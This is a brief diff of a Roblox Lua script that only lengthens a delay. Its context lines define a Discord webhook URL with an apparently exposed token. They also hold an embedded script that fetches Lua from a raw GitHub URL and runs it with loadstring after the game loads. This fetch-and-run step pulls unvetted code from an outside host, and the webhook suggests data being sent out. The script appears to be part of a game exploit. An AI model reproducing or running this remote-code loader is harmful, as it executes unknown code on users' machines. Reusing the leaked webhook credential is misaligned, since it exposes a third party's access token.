@@ -8,7 +8,7 @@ local webhookUrl = "https://discord.com/api/webhooks/1384910804377141338/PYYqx97
 local scriptToRun = [[
     -- Wait until the game is fully loaded
     game.Loaded:Wait()
-    wait(2)
+    wait(10)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/mrricky22/newtest2/refs/heads/main/new.lua"))()
 ]]
 
